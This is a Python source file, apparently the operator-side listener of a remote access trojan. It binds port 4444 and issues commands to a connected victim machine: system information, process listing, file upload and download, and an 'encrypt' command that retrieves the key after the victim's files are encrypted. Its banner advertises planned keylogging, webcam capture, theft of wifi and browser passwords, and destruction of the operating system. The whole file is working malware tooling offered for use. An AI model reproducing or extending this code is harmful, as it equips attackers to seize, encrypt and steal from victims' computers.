__author__ = "Abenezer"

from Imports import *

print('''
AVALIABLE COMMANDS 
1) shutdown [ usage ] -> shutdown
2) restart  [ usage ] -> restart
3) logout   [ usage ] -> logout
4) download [ usage ] -> download + fileName
5) upload   [ usage ] -> upload + fileName
6) kill     [ usage ] -> kill chromium   -> kill + processName
7) bgps     [ usage ] -> bgps --> for listing all background processes
8) sysinfo  [ usage ] -> sysinfo --> for getting system's info
9) exit     [ usage ] -> exit --> for safely exiting the program
10) encrypt [ usage ] -> encrypt --> Commnd for encrypting directory level files
11) all system commands like cd,pwd,ls,ls -lia,cat,ifconfig,iwconfig and so on....

COMMING SOON COMMANDS 😂

1) keylogging
2) webcam
3) screenshot
4) wifipass --> command for extracting saved wifi passwords
5) chrompass --> command for extracting saved passwords from chromium browser
6) distroy  --> for completly distroying the os
7) prank
''')

class Listner:
    def __init__(self, ip, port):
        self.listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        self.listner.bind((ip,port))
        self.listner.listen(3)
        
        
    def send(self,command,conn):
        conn.send(json.dumps(command).encode())
   
    
    def recive(self,conn):
        json_data = ""
        
        while True:
            try:
                json_data += conn.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
      
      
    def download(self,path,data):
        with open(path,'wb') as file:
            file.write(base64.b64decode(data))
            
            
    def upload(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())
        
    
    
    def start(self):
        print('[+] Waiting for incomming connecitons.....\n')
        conn, addr = self.listner.accept()
        print('[+] Connection has been established with IpAdress: {} and  PortNumber: {}\n'.format(addr[0],addr[1]))

        while True:
            command = input('>> ')
            self.send(command,conn)
            if command == "exit":
                conn.close()
                os.system('clear')
                exit(0)
            
            commandResult = self.recive(conn)
            if command.split()[0].lower() == "sysinfo" and len(command.split()) == 1:
                print("platform:",commandResult['platform'])
                print("platform-release:", commandResult['platform-release'])
                print("platform-version:",commandResult['platform-version'])
                print("architecture:",commandResult['architecture'])
                print("hostname:",commandResult['hostname'])
                print("ip-address:",commandResult['ip-address'])
                print("mac-address:",commandResult['mac-address'])
                print("ram:",commandResult['ram'])
            
            elif command.split()[0].lower() == "bgps" and len(command.split()) == 1:
                from pprint import PrettyPrinter
                pprint = PrettyPrinter(indent=4)
                pprint.pprint(commandResult)
                
            elif command.split()[0].lower() == 'encrypt' and len(command.split()) == 1:
                self.download("FernetKey.txt",commandResult.encode())
                print("Done Sir")
                
            elif command.split()[0].lower() == "decrypt" and len(command.split()) == 1:
                self.send(self.upload("FernetKey.txt").decode(),conn)
                
            elif command.split()[0].lower() == "download" and len(command.split()) > 1:
                self.download(command.split()[1],commandResult.encode())
                print("File downloaded successfully!")
                
            elif command.split()[0].lower() == "upload" and len(command.split()) > 1:
                self.send(self.upload(command.split()[1]).decode(),conn)
                print("File uploded successfully!")
                
            else:
                print(commandResult)
                
    def __str__(self):
        return "Listner Class"
                
listner = Listner('localhost',4444)
listner.start()


